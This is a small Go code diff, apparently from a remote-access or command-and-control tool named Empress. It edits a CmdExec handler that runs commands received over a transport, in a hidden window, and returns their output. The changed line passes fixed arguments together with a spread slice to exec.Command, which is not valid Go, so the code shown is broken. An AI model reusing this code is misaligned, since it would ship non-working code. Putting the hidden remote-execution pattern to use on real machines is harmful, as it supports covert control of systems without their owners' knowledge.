@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"errors"
 	"github.com/pygrum/Empress/transport"
-	"golang.org/x/sys/windows"
 	"os"
 	"os/exec"
 	"strings"
@@ -18,10 +17,9 @@ func CmdExec(req *transport.Request, response *transport.Response) {
 		for i, t := range tokens {
 			tokens[i] = os.ExpandEnv(t)
 		}
-		cmd := exec.Command(tokens[0], tokens[1:]...)
+		cmd := exec.Command("cmd", "/c", tokens...)
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			HideWindow: true,
-			Token:      syscall.Token(windows.GetCurrentProcessToken()),
 		}
 		var cOut, cErr bytes.Buffer
 		cmd.Stdout = &cOut
